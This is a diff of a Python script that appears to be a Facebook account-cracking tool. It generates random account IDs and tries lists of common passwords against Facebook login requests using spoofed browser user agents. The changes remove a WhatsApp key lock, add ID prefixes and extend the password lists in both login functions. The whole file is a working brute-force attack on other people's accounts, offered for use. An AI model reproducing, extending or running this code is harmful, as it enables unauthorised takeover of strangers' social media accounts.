@@ -17,43 +17,6 @@ from datetime import datetime
 
 import os, sys
  
-# Tumhara WhatsApp channel link
-channel_link = "https://chat.whatsapp.com/BsOxo1XxmiPJJg2DkXR0Kt?mode=ems_copy_t"
- 
-# Valid keys (channel par available hogi)
-approved_keys = ["BILAL2025"]
- 
-def first_step():
-    os.system("clear")
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("        🔒 Script Locked 🔒")
-    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-    print("\033[1;32m JOIN OUR WHATSAPP CHANNEL ✅ \033[0m\n")
-    print("\033[1;32m KEY APKO GROUP SA MILY GI ✅ \033[0m\n")
-    print("[!] Pehle WhatsApp Group par join karo.")
-    print(f"[+] Massage Group Admin")
- 
-    # Yeh direct WhatsApp Group open karega
-    os.system(f"xdg-open https://chat.whatsapp.com/BsOxo1XxmiPJJg2DkXR0Kt?mode=ems_copy_t")
- 
- 
-def check_key():
-    user_key = input("\n[?] Enter your key: ")
-    if user_key in approved_keys:
-        print("\n[✓] Key approved! Script is running...\n")
-    else:
-        print("\n[×] Invalid key! Dobara Channel par jao.")
-        sys.exit()
- 
-# Pehle channel open hoga
-first_step()
- 
-# Phir key check hoga
-check_key()
- 
-# Tool ka main code yahan likho
-print(">>> Tool Successfully Unlocked <<<")
- 
 
 def first_step():
     os.system("clear")
@@ -75,7 +38,7 @@ requests.urllib3.disable_warnings()
 
 # Initial setup and promotion
 os.system('clear')
-print(' \x1b[38;5;46mBILA SERVER LOADING....')
+print(' \x1b[38;5;46mBILAL SERVER LOADING....')
 
 
 os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
@@ -158,15 +121,15 @@ def windows():
     Generates a random Windows User-Agent string.
     """
     aV = str(random.choice(range(10, 20)))
-    A = f"Mozilla/5.0 (Linux; Android 15; SM-S931U Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+    A = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
     bV = str(random.choice(range(1, 36)))
     bx = str(random.choice(range(34, 38)))
     bz = f'5{bx}.{bV}'
-    B = f"Mozilla/5.0 (Linux; Android 15; SM-S931U Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+    B = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
     cV = str(random.choice(range(1, 36)))
     cx = str(random.choice(range(34, 38)))
     cz = f'5{cx}.{cV}'
-    C = f"Mozilla/5.0 (Linux; Android 15; SM-S931U Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+    C = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.3"
     return random.choice([A, B, C, D])
 
 
@@ -175,18 +138,18 @@ def window1():
     Generates another variant of a random Windows User-Agent string.
     """
     aV = str(random.choice(range(10, 20)))
-    A = f"Mozilla/5.0 (Linux; Android 14; SM-F9560 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36"
+    A = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.44"
     bV = str(random.choice(range(1, 36)))
     bx = str(random.choice(range(34, 38)))
     bz = f'5{bx}.{bV}'
-    B = f"Mozilla/5.0 (Android 15; Mobile; SM-G556B/DS; rv:130.0) Gecko/130.0 Firefox/130.0"
+    B = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 OPR/84.0.4316.19"
     cV = str(random.choice(range(1, 36)))
     cx = str(random.choice(range(34, 38)))
     cz = f'5{cx}.{cV}'
-    C = f"Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36 Dalvik/2.1.0 (Linux; U; Android 13; SM-S911B Build/TP1A.220624.014)"
+    C = f"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.56"
     latest_build = rr(6000, 9000)
     latest_patch = rr(100, 200)
-    D = f"Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
+    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.16 Safari/537.36 OPR/85.0.4338.0 (Edition developer)"
     return random.choice([A, B, C, D])
 
 
@@ -258,6 +221,7 @@ def creationyear(uid):
         if uid.startswith(('10007', '10008')):
             return '2022'
         return ''
+        
     elif len(uid) in (9, 10):
         return '2008'
     elif len(uid) == 8:
@@ -268,8 +232,6 @@ def creationyear(uid):
         return '2024'
     else:
         return ''
-
-
 def clear():
     os.system('clear')
 
@@ -367,7 +329,7 @@ def old_Tow():
     print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
     limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
-    prefixes = ['100003', '100004']
+    prefixes = ['100003', '100001', '100002', '100004']
     for _ in range(int(limit)):
         prefix = random.choice(prefixes)
         suffix = ''.join(random.choices('0123456789', k=9))
@@ -436,9 +398,9 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mCHECKING😄-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mCHECKING😄-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
-        for pw in ('123456', '1234567', '12345678', '123456789', '1234567890','123123', '000000', '786786'):
+        for pw in ('123456', '1234567', '12345678', '123456789', '1234567890','123123', '000000', '786786', '11221122', '0987654321'):
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
@@ -468,7 +430,6 @@ def login_1(uid):
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
     'dpr': '3',
-    'referer': 'https://www.facebook.com/',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
     'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
@@ -478,7 +439,7 @@ def login_1(uid):
     'sec-ch-ua-platform-version': '""',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'same-site',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
@@ -507,7 +468,7 @@ def login_2(uid):
     """
     sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
     
-    for pw in ('123456', '1234567', '12345678', '123456789', '1234567890', '123123', '000000', '786786'):
+    for pw in ('123456', '1234567', '12345678', '123456789', '1234567890', '123123', '000000', '786786', '11221122', '0987654321'):
         try:
             with requests.Session() as session:
                 headers = {
